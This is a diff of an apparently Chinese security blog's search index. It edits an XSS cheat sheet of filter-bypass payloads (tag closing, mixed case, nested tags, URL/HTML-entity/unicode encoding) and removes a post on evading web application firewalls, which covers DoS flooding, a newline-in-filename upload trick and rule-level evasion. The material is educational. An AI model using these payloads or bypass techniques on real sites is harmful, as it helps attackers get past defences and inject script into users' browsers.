         <tag>漏洞</tag>
+        <tag>vulhub</tag>
         <tag>Struts2</tag>
       </tags>
   </entry>
@@ -5988,45 +6724,14 @@ echo $xss;</code></pre><p><strong>test.html</strong></p>
     &lt;!--a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;XSS&lt;/a--&gt; &lt;!--弹窗--&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre><h2 id="0x02-常用"><a href="#0x02-常用" class="headerlink" title="0x02 常用"></a>0x02 常用</h2><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert`1`&lt;/script&gt;
 &lt;svg/onload=alert(1)&gt;
 &lt;img src=1 onerror=alert(1)&gt;
 &lt;plaintext/onmouseover=prompt(1)&gt;
 &lt;a onmouseover=alert(1)&gt;1&lt;/a&gt;
-javascript:alert(1)</code></pre><h2 id="0x03-标签-元素"><a href="#0x03-标签-元素" class="headerlink" title="0x03 标签/元素"></a>0x03 <a href="https://www.runoob.com/tags/ref-byfunc.html" target="_blank" rel="noopener">标签/元素</a></h2><p><strong>空标签 即无关闭标签</strong></p>
-<ul>
-<li>&lt;area&gt;</li>
-<li>&lt;base&gt;</li>
-<li>&lt;br&gt;</li>
-<li>&lt;col&gt;</li>
-<li>&lt;colgroup&gt;</li>
-<li>&lt;command&gt;</li>
-<li>&lt;embed&gt;</li>
-<li>&lt;hr&gt;</li>
-<li>&lt;img&gt;</li>
-<li>&lt;input&gt;</li>
-<li>&lt;keygen&gt;</li>
-<li>&lt;link&gt;</li>
-<li>&lt;meta&gt;</li>
-<li>&lt;param&gt;</li>
-<li>&lt;source&gt;</li>
-<li>&lt;track&gt;</li>
-<li>&lt;wbr&gt;</li>
-</ul>
-<p><a href="https://www.jianshu.com/p/5a78a19f18bf" target="_blank" rel="noopener">各种标签分类</a></p>
-<h2 id="0x04-事件"><a href="#0x04-事件" class="headerlink" title="0x04 事件"></a>0x04 事件</h2><ul>
-<li>onclick</li>
-<li>onload</li>
-<li>onmouseover</li>
-<li>onerror</li>
-</ul>
-<h2 id="0x05-函数"><a href="#0x05-函数" class="headerlink" title="0x05 函数"></a>0x05 函数</h2><ul>
-<li>alert()</li>
-<li>prompt()</li>
-<li>confirm()</li>
-<li>alert(String.fromCharCode(88,83,83))</li>
-</ul>
-<h2 id="0x06-闭合"><a href="#0x06-闭合" class="headerlink" title="0x06 闭合"></a>0x06 闭合</h2><pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><h2 id="0x07-大小写绕过"><a href="#0x07-大小写绕过" class="headerlink" title="0x07 大小写绕过"></a>0x07 大小写绕过</h2><pre><code>&lt;scRIpt&gt;ALert(1)&lt;/SCriPt&gt;</code></pre><h2 id="0x08-多标签绕过"><a href="#0x08-多标签绕过" class="headerlink" title="0x08 多标签绕过"></a>0x08 多标签绕过</h2><pre><code>&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/script&gt;
-&lt;asd&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;/asd&gt;</code></pre><h2 id="0x09-各种编码与部分编码"><a href="#0x09-各种编码与部分编码" class="headerlink" title="0x09 各种编码与部分编码"></a>0x09 各种编码与部分编码</h2><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;XSS&lt;/a&gt; //URL编码:URL编码
+javascript:alert(1)</code></pre><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a href="https://www.runoob.com/tags/html-reference.html" target="_blank" rel="noopener">标签</a><br><a href="https://www.jianshu.com/p/5a78a19f18bf" target="_blank" rel="noopener">各种标签分类</a><br><a href="https://www.w3school.com.cn/js/jsref_events.asp" target="_blank" rel="noopener">事件</a><br><a href="https://www.runoob.com/jsref/obj-window.html" target="_blank" rel="noopener">window对象方法与对象属性</a></p>
+<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><pre><code>&lt;scRIpt&gt;ALert(1)&lt;/SCriPt&gt;</code></pre><h3 id="多标签绕过"><a href="#多标签绕过" class="headerlink" title="多标签绕过"></a>多标签绕过</h3><pre><code>&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/script&gt;
+&lt;asd&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;/asd&gt;</code></pre><h3 id="各种编码与部分编码"><a href="#各种编码与部分编码" class="headerlink" title="各种编码与部分编码"></a>各种编码与部分编码</h3><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;XSS&lt;/a&gt; //URL编码:URL编码
 &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%31%29&quot;&gt;XSS&lt;/a&gt; //HTML字符实体编码:URL编码
 &lt;button onclick=&quot;confirm(&#39;7&amp;#39;);&quot;&gt;Button&lt;/button&gt; //HTML字符实体编码
 &lt;button onclick=&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;/button&gt; //unicode编码</code></pre><p>javascript:alert(1)</p>
@@ -6449,11 +7154,6 @@ class HomeController {
       </tags>
   </entry>
   <entry>
-    <title>WordPress安全配置——未完待续</title>
-    <url>/WordPress%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>正则表达式</title>
     <url>/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
     <content><![CDATA[<h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><ol>
@@ -6552,18 +7252,6 @@ class HomeController {
 <li><img src="/DNS%E8%AE%B0%E5%BD%95/2.png" alt></li>
 <li>dig domain +trace #+trace，dig会根据查询一直追踪直到查询到最终结果。</li>
 <li><img src="/DNS%E8%AE%B0%E5%BD%95/4.png" alt></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>脑图</title>
-    <url>/%E8%84%91%E5%9B%BE/</url>
-    <content><![CDATA[<h2 id="网络攻击与防范"><a href="#网络攻击与防范" class="headerlink" title="网络攻击与防范"></a>网络攻击与防范</h2><ol>
-<li><img src="/%E8%84%91%E5%9B%BE/1.jpeg" alt></li>
-<li><img src="/%E8%84%91%E5%9B%BE/2.jpeg" alt></li>
 </ol>
 ]]></content>
       <tags>
@@ -7318,85 +8006,6 @@ class HomeController {
       <tags>
         <tag>信息搜集</tag>
         <tag>CDN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>绕WAF基础</title>
-    <url>/%E7%BB%95WAF%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h2 id="0x00-WAF-amp-amp-CDN"><a href="#0x00-WAF-amp-amp-CDN" class="headerlink" title="0x00 WAF &amp;&amp; CDN"></a>0x00 WAF &amp;&amp; CDN</h2><p><img src="/%E7%BB%95WAF%E5%9F%BA%E7%A1%80/1.png" alt></p>
-<ol>
-<li>WAF（Web Application Firewall）：Web应用防火墙。</li>
-<li>WAF是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</li>
-<li>CDN（Content Delivery Network）：内容分发网络。</li>
-<li>CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</li>
-<li>WAF有三种：云WAF、硬WAF、软WAF。</li>
-<li>云WAF：百度云加速、阿里云云盾等，部署简单，维护成本低，可当CDN，但存在被绕过。</li>
-<li>硬WAF：nsfocus、imperva等，串行部署在web服务器前端，检测、拦截异常流量，即插即用，防护范围大，但成本高</li>
-<li>软WAF：安全狗、D盾等，安装在需防护的服务器上，监听端口，检测或拦截外来的非法请求，免费且管理方便，但易误杀，占用内存多。</li>
-</ol>
-<h2 id="0x01-主流WAF"><a href="#0x01-主流WAF" class="headerlink" title="0x01 主流WAF"></a>0x01 主流WAF</h2><p><strong>云WAF</strong></p>
-<ol>
-<li>阿里云盾</li>
-<li>腾讯网站管家</li>
-<li>创宇盾</li>
-<li>cloudflare</li>
-</ol>
-<p><strong>软件WAF</strong></p>
-<ol>
-<li>安全狗</li>
-<li>云锁</li>
-<li>360主机卫士</li>
-<li>Modsecurity</li>
-</ol>
-<p><strong>硬件WAF</strong></p>
-<ol>
-<li>启明星辰</li>
-<li>绿盟</li>
-<li>天融信</li>
-<li>飞塔</li>
-</ol>
-<h2 id="0x02-绕WAF"><a href="#0x02-绕WAF" class="headerlink" title="0x02 绕WAF"></a>0x02 绕WAF</h2><ol>
-<li>从架构层绕WAF</li>
-<li>从匹配资源大小限制绕WAF</li>
-<li>从协议层绕WAF</li>
-<li>从规则层绕WAF</li>
-</ol>
-<h2 id="0x03-从架构层绕WAF"><a href="#0x03-从架构层绕WAF" class="headerlink" title="0x03 从架构层绕WAF"></a>0x03 从架构层绕WAF</h2><ol>
-<li>原理：云WAF、CDN等，通过更改DNS解析，将流量流过WAF区，检测后判定为非攻击流量再转发到目的网站。</li>
-<li>所以，这里绕WAF就是，找到目的网站的真实IP：<a href="https://10fteam.github.io/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/">https://10fteam.github.io/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/</a></li>
-<li>利用同网段的其他服务器来绕过，例如：VPS，自己买的VPS与目的网站是同个云厂商，所以VPS相当于在局域网，可能不经过WAF，实际看云厂商的网络配置。（SSRF）</li>
-</ol>
-<h2 id="0x04-从匹配资源大小限制绕WAF"><a href="#0x04-从匹配资源大小限制绕WAF" class="headerlink" title="0x04 从匹配资源大小限制绕WAF"></a>0x04 从匹配资源大小限制绕WAF</h2><ol>
-<li>DOS/CC</li>
-<li>过多的HTTP请求耗尽WAF的处理能力，然后流量可能就直接到目的网站。</li>
-<li>过大的HTTP请求POST内容来消耗WAF的内容检查的CPU资源、内存资源等等，如果WAF只处理前面的几K、几M内容，那payload放在后面，未被检测而到达目的网站。</li>
-</ol>
-<h2 id="0x05-从协议层绕WAF"><a href="#0x05-从协议层绕WAF" class="headerlink" title="0x05 从协议层绕WAF"></a>0x05 从协议层绕WAF</h2><ol>
-<li>有的CDN只针对HTTP/HTTPS协议，其他协议却不作处理就放行。</li>
-<li>原因：1.协议覆盖不全，2.协议解析不一致，3.协议解析与web容器的协议解析不一致</li>
-<li><strong>协议覆盖不全</strong></li>
-<li>例子：POST请求常用的两种内容类型：</li>
-<li>Content-Type: application/x-www-form-urlencoded;</li>
-<li>Content-Type: multipart/form-data;</li>
-<li>WAF未能覆盖某一个导致被绕过，或者WAF认为是文件上传请求而只检测文件上传导致被绕过。</li>
-<li><strong>协议解析不一致</strong></li>
-<li>例子：文件上传，文件名为1.jpg0x0a1.php，0x0a是\n，换行的意思，WAF解析为jpg文件，php解析为php文件，所以存在被绕过。(还有多行文件名等绕过)</li>
-</ol>
-<h2 id="0x06-从规则层绕WAF"><a href="#0x06-从规则层绕WAF" class="headerlink" title="0x06 从规则层绕WAF"></a>0x06 从规则层绕WAF</h2><ol>
-<li>注释符绕过</li>
-<li>空白符绕过</li>
-<li>函数替换拆分绕过</li>
-<li>大小写绕过</li>
-<li>编码解码绕过</li>
-<li>特定函数绕过</li>
-</ol>
-<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
-<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>知识</tag>
-        <tag>WAF</tag>
       </tags>
   </entry>
   <entry>
